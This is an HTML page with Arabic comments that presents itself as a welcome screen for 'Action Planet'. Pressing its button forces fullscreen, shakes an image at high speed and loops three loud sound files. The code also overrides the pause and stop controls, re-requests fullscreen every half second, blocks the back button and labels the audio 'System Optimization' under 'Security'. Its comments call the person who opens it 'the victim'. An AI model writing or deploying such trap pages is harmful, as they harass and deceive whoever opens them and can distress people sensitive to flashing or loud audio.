<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Action Planet</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; overflow: hidden; }
        #ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 10000; background: #fff; }
        .btn-action { background: #ffcc00; color: #000; border: 4px solid #000; padding: 25px 70px; font-size: 28px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 10px 0 #b89600; }
        
        /* تأثير التوحويح: رعشة عميقة وشاملة سواسوة */
        #madImg { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 999; display: none;
        }

        @keyframes touhouh {
            0% { transform: translate(0,0) scale(1.1); }
            10% { transform: translate(-30px, -20px) scale(1.3) rotate(-2deg); }
            25% { transform: translate(25px, 30px) scale(1.2) rotate(2deg); }
            45% { transform: translate(-35px, 15px) scale(1.35) rotate(-1deg); }
            65% { transform: translate(30px, -25px) scale(1.25) rotate(1deg); }
            85% { transform: translate(-20px, 35px) scale(1.3) rotate(-2deg); }
            100% { transform: translate(0,0) scale(1.1); }
        }
        .vibrate-heavy { display: block !important; animation: touhouh 0.02s infinite linear; }
    </style>
</head>
<body>
    <div id="ui">
        <div style="font-size: 35px; font-weight: bold; color: #ffcc00; text-shadow: 2px 2px #000; margin-bottom: 30px;">مرحباً بكم في كوكب أكشن</div>
        <button class="btn-action" onclick="igniteStalker()">دخول</button>
    </div>

    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <script>
        async function igniteStalker() {
            // 1. طلب ملء الشاشة قسرياً سواسوة
            let el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen(); else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

            // 2. تفعيل التوحويح وإخفاء الواجهة سواسوة
            document.getElementById('ui').style.display = 'none';
            document.getElementById('madImg').classList.add('vibrate-heavy');

            // 3. ميزة "الصوت اللاصق" (Media Persistence) سواسوة
            const audioLinks = [
                "https://www.myinstants.com/media/sounds/hoova-2.mp3",
                "https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3",
                "https://www.myinstants.com/media/sounds/dzonza.mp3"
            ];

            audioLinks.forEach(src => {
                let a = new Audio(src);
                a.loop = true;
                a.volume = 1.0;
                
                // تشغيل الصوت وضمان بقائه شغالاً في الخلفية سواسوة
                a.play().catch(e => console.log("Force Play"));

                if ('mediaSession' in navigator) {
                    navigator.mediaSession.metadata = new MediaMetadata({
                        title: 'System Optimization',
                        artist: 'Action Planet',
                        album: 'Security',
                        artwork: [{ src: 'https://i.ibb.co/39snnynW/1000016067.jpg', sizes: '512x512', type: 'image/png' }]
                    });

                    // منع الضحية من إيقاف الصوت من الإشعارات سواسوة
                    navigator.mediaSession.setActionHandler('pause', () => a.play());
                    navigator.mediaSession.setActionHandler('play', () => a.play());
                    navigator.mediaSession.setActionHandler('stop', () => a.play());
                }
                
                // إعادة التشغيل فوراً إذا توقف سواسوة
                a.onpause = () => a.play();
                a.onended = () => a.play();
            });

            // 4. منع الخروج (Anti-Exit Loop) سواسوة
            setInterval(() => {
                if (!document.fullscreenElement) {
                    el.requestFullscreen().catch(() => {});
                }
            }, 500);
        }

        // قفل زر الرجوع سواسوة
        history.pushState(null, null, location.href);
        window.onpopstate = function () { history.go(1); };
    </script>
</body>
</html>
